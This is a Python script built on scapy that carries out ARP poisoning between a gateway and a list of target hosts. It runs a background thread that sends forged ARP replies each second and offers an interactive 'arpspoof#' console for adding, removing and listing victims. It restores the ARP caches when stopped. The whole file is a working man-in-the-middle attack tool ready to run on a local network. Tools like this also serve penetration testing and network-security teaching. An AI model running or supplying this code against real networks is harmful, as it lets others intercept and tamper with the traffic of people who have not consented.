#!/usr/bin/env python3
import sys
import argparse
import threading
import queue
import time
from scapy.all import *

# index values into tuples
IP = CMD = 0
MAC = TARGET = 1

def parse_args():
    parser = argparse.ArgumentParser(description='Do ARP poisoning between ' +
                                                 'a gateway and several ' +
                                                 'targets')
    parser.add_argument('-i', '--interface', dest='interface',
                        help='interface to send from')
    parser.add_argument('-t', '--targets', dest='targets',
                        help='comma-separated list of IP addresses',
                        required=True)
    parser.add_argument('-g', '--gateway', dest='gateway',
                        help='IP address of the gateway', required=True)
    return parser.parse_args()

def get_MAC(interface, target_IP):
    source_IP = get_if_addr(interface)
    source_MAC = get_if_hwaddr(interface)
    p = ARP(hwsrc=source_MAC, psrc=source_IP)  # ARP request by default
    p.hwdst = 'ff:ff:ff:ff:ff:ff'
    p.pdst = target_IP
    reply, unans = sr(p, timeout=5, verbose=0)
    if len(unans) > 0:
        # received no reply
        raise Exception('Error finding MAC for %s, try using -i' % target_IP)
    return reply[0][1].hwsrc

def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
    finish = False
    while not finish:
        while control_queue.empty():
            for t in targets:
                send_ARP(t[IP], t[MAC], gateway[IP], attacker_MAC)
                send_ARP(gateway[IP], gateway[MAC], t[IP], attacker_MAC)
            time.sleep(1)

        try:
            item = control_queue.get(block=False)
        except queue.Empty:
            print('Something broke, your queue idea sucks.')

        cmd = item[CMD].lower()
        if cmd in ['quit', 'exit', 'stop', 'leave']:
            finish = True

        elif cmd in ['add', 'insert']:
            targets.append(item[TARGET])

        elif cmd in ['del', 'delete', 'remove']:
            try:
                targets.remove(item[TARGET])
                restore_ARP_caches([item[TARGET]], gateway, False)
            except ValueError:
                print(f"{item[TARGET][0]} not in target list")

        elif cmd in ['list', 'show', 'status']:
            print('Current targets:')
            print(f'Gateway: {gateway[IP]} ({gateway[MAC]})')
            for t in targets:
                print(f"{t[IP]} ({t[MAC]})")
    restore_ARP_caches(targets, gateway)


def restore_ARP_caches(targets, gateway, verbose=True):
    print('Stopping the attack, restoring ARP cache')
    for i in range(3):
        if verbose:
            print(f"ARP {gateway[IP]} is at {gateway[MAC]}")
        for t in targets:
            if verbose:
                print(f"ARP {t[IP]} is at {t[MAC]}")
            send_ARP(t[IP], t[MAC], gateway[IP], gateway[MAC])
            send_ARP(gateway[IP], gateway[MAC], t[IP], t[MAC])
        time.sleep(1)
    print('Restored ARP caches')


def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC):
    arp_packet = ARP(op=2, pdst=destination_IP, hwdst=destination_MAC,
                     psrc=source_IP, hwsrc=source_MAC)
    send(arp_packet, verbose=0)

def main():
    args = parse_args()
    control_queue = queue.Queue()

    interface = args.interface or conf.iface
    attacker_MAC = get_if_hwaddr(interface)

    print(f'Using interface {interface} ({attacker_MAC})')
    try:
        targets = [(t.strip(), get_MAC(interface, t.strip())) for t in args.targets.split(',')]
    except Exception as e:
        print(e)
        sys.exit(1)

    try:
        gateway = (args.gateway, get_MAC(interface, args.gateway))
    except Exception as e:
        print(e)
        sys.exit(2)

    poison_thread = threading.Thread(target=start_poison_thread, args=(targets, gateway, control_queue, attacker_MAC))
    poison_thread.start()

    try:
        while poison_thread.is_alive():
            time.sleep(1)
            command = input('arpspoof# ').split()
            if command:
                cmd = command[CMD].lower()
                if cmd in ['help', '?']:
                    print("add <IP>: add IP address to target list\n"
                          "del <IP>: remove IP address from target list\n"
                          "list: print all current targets\n"
                          "exit: stop poisoning and exit")
                elif cmd in ['quit', 'exit', 'stop', 'leave', 'list', 'show', 'status', 'add', 'insert', 'del', 'delete', 'remove']:
                    # If the command requires an IP as argument (like 'add' or 'del')
                    if len(command) > 1:
                        ip = command[TARGET]
                        try:
                            t = (ip, get_MAC(interface, ip))
                            control_queue.put((cmd, t))
                        except Exception as e:
                            print(f'Can not {cmd} {ip}')
                            print(e)
                    else:
                        control_queue.put((cmd,))

    except KeyboardInterrupt:
        control_queue.put(('quit',))
        poison_thread.join()

if __name__ == '__main__':
    main()
